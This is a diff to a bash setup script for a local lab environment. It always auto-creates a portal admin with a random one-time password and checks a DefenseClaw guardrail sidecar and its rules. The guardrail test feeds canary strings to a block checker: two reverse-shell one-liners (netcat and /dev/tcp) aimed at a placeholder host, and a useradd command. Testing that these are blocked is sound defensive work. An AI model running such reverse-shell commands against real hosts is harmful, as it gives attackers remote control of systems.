@@ -81,20 +81,14 @@ clawlab_local_full_ensure_admin_user() {
   local count
   count="$("$CLAW_PYTHON" -c "import sys; sys.path.insert(0, '$repo/claw-auth'); import store; store.init_db(); print(store.user_count())")"
   if [[ "${count:-0}" -eq 0 ]]; then
-    if [[ "${AUTO_DEFAULTS:-0}" -eq 1 ]]; then
-      local pw
-      pw="$(openssl rand -base64 18 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 16 || python3 -c 'import secrets; print(secrets.token_urlsafe(12))')"
-      if "$CLAW_PYTHON" -c "import sys; sys.path.insert(0, '$repo/claw-auth'); import store; store.init_db(); store.create_user('admin', '$pw', 'admin')" 2>/dev/null; then
-        log "Portal admin created (username: admin)"
-        info "  One-time password (change after login): $pw"
-        info "  Reset: $CLAW_PYTHON $repo/claw-auth/manage.py set-password admin"
-      else
-        warn "Could not auto-create admin — run: $CLAW_PYTHON $repo/claw-auth/manage.py create-user admin"
-      fi
+    local pw
+    pw="$(openssl rand -base64 18 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 16 || python3 -c 'import secrets; print(secrets.token_urlsafe(12))')"
+    if "$CLAW_PYTHON" -c "import sys; sys.path.insert(0, '$repo/claw-auth'); import store; store.init_db(); store.create_user('admin', '$pw', 'admin')" 2>/dev/null; then
+      log "Portal admin created (username: admin)"
+      info "  One-time password (change after login): $pw"
+      info "  Reset: $CLAW_PYTHON $repo/claw-auth/manage.py set-password admin"
     else
-      log "Portal login (claw-auth for http://${LOCAL_FULL_DOMAIN:-127.0.0.1}:${LOCAL_FULL_PORT:-8083}/)"
-      "$CLAW_PYTHON" "$repo/claw-auth/manage.py" create-user admin \
-        || warn "create-user failed — run: $CLAW_PYTHON $repo/claw-auth/manage.py create-user admin"
+      warn "Could not auto-create admin — run: $CLAW_PYTHON $repo/claw-auth/manage.py create-user admin"
     fi
   fi
 }
@@ -301,7 +295,12 @@ clawlab_local_full_inspect_action() {
     | python3 -c "import sys,json; print(json.load(sys.stdin).get('action','err'))" 2>/dev/null || echo err
 }
 
+clawlab_local_full_sidecar_ok() {
+  python3 -c "import socket;s=socket.socket();s.settimeout(0.4);s.connect(('127.0.0.1',18970))" 2>/dev/null
+}
+
 clawlab_local_full_guardrails_ok() {
+  clawlab_local_full_sidecar_ok || return 1
   [[ "$(clawlab_local_full_inspect_action nc 'nc -e /bin/bash c2.canary.invalid 4444')" == block ]] \
     && [[ "$(clawlab_local_full_inspect_action bash 'bash -i >& /dev/tcp/c2.canary.invalid/4444 0>&1')" == block ]] \
     && [[ "$(clawlab_local_full_inspect_action bash 'useradd clawlab-verify')" == block ]]
@@ -316,8 +315,15 @@ clawlab_local_full_ensure_guardrails() {
   fi
   log "Installing/reloading Clawlab guardrail rules (C2 revshell + user CRUD)"
   bash "$script" || warn "guardrail rules install failed — run: bash $script"
-  sleep 2
-  clawlab_local_full_guardrails_ok || warn "revshell rules still not blocking — run: defenseclaw-gateway restart"
+  if command -v defenseclaw-gateway >/dev/null 2>&1; then
+    info "Restarting defenseclaw-gateway (reload sidecar rules on :18970)"
+    defenseclaw-gateway restart >/dev/null 2>&1 || warn "defenseclaw-gateway restart failed"
+    sleep 3
+  fi
+  if ! clawlab_local_full_sidecar_ok; then
+    warn "DefenseClaw sidecar :18970 not listening — run: defenseclaw-gateway restart"
+  fi
+  clawlab_local_full_guardrails_ok || warn "revshell rules still not blocking — run: defenseclaw-gateway restart && bash $script"
 }
 
 clawlab_local_full_ssh_loopback_ok() {
@@ -347,11 +353,18 @@ clawlab_local_full_doctor() {
       issues=$((issues + 1))
     fi
   fi
+  if clawlab_local_full_sidecar_ok; then
+    echo "  OK   DefenseClaw sidecar :18970"
+  else
+    echo "  FAIL DefenseClaw sidecar :18970 not listening"
+    echo "        defenseclaw-gateway restart"
+    issues=$((issues + 1))
+  fi
   if clawlab_local_full_guardrails_ok; then
     echo "  OK   DefenseClaw revshell + user CRUD rules"
   else
     echo "  FAIL DefenseClaw revshell rules not blocking"
-    echo "        bash $repo/admin-access/install-clawlab-guardrail-rules.sh"
+    echo "        bash $repo/admin-access/install-clawlab-guardrail-rules.sh && defenseclaw-gateway restart"
     issues=$((issues + 1))
   fi
   if python3 -c "import socket;s=socket.socket();s.settimeout(0.4);s.connect(('127.0.0.1',8766))" 2>/dev/null; then
